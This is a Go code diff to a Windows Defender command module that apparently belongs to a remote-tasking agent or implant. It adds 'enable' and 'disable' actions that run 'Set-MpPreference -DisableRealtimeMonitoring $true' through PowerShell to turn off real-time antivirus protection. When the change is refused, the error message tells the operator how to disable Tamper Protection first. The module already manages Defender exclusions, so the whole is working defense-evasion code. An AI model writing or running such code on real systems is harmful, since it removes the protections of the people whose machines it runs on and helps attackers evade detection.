@@ -25,7 +25,7 @@ func (c *DefenderCommand) Name() string {
 }
 
 func (c *DefenderCommand) Description() string {
-	return "Query Windows Defender status, manage exclusions, and view threat history"
+	return "Manage Windows Defender — status, exclusions, threats, enable/disable real-time protection"
 }
 
 type defenderArgs struct {
@@ -39,7 +39,7 @@ func (c *DefenderCommand) Execute(task structs.Task) structs.CommandResult {
 
 	if task.Params == "" {
 		return structs.CommandResult{
-			Output:    "Error: parameters required. Actions: status, exclusions, add-exclusion, remove-exclusion, threats",
+			Output:    "Error: parameters required. Actions: status, exclusions, add-exclusion, remove-exclusion, threats, enable, disable",
 			Status:    "error",
 			Completed: true,
 		}
@@ -64,9 +64,13 @@ func (c *DefenderCommand) Execute(task structs.Task) structs.CommandResult {
 		return defenderRemoveExclusion(args)
 	case "threats":
 		return defenderThreats()
+	case "enable":
+		return defenderSetRealtime(true)
+	case "disable":
+		return defenderSetRealtime(false)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: status, exclusions, add-exclusion, remove-exclusion, threats", args.Action),
+			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: status, exclusions, add-exclusion, remove-exclusion, threats, enable, disable", args.Action),
 			Status:    "error",
 			Completed: true,
 		}
@@ -458,6 +462,49 @@ func defenderRemoveExclusion(args defenderArgs) structs.CommandResult {
 
 	return structs.CommandResult{
 		Output:    fmt.Sprintf("Removed Defender %s exclusion: %s", exType, args.Value),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+// defenderSetRealtime enables or disables Windows Defender real-time protection.
+// Uses Set-MpPreference via PowerShell. Requires administrator privileges.
+// May fail if Tamper Protection is enabled (Windows 10 1903+).
+func defenderSetRealtime(enable bool) structs.CommandResult {
+	var psCmd string
+	if enable {
+		psCmd = "Set-MpPreference -DisableRealtimeMonitoring $false"
+	} else {
+		psCmd = "Set-MpPreference -DisableRealtimeMonitoring $true"
+	}
+
+	output, err := defenderRunPowerShell(psCmd)
+	if err != nil {
+		errMsg := fmt.Sprintf("Error: %v", err)
+		if output != "" {
+			errMsg += fmt.Sprintf("\nOutput: %s", output)
+		}
+		if strings.Contains(errMsg, "denied") || strings.Contains(errMsg, "Tamper") {
+			errMsg += "\nNote: Tamper Protection may be blocking this change. Disable it via Windows Security UI or Group Policy first."
+		}
+		return structs.CommandResult{
+			Output:    errMsg,
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	action := "Enabled"
+	if !enable {
+		action = "Disabled"
+	}
+	result := fmt.Sprintf("%s Windows Defender real-time protection", action)
+	if output != "" {
+		result += fmt.Sprintf("\n%s", output)
+	}
+
+	return structs.CommandResult{
+		Output:    result,
 		Status:    "success",
 		Completed: true,
 	}
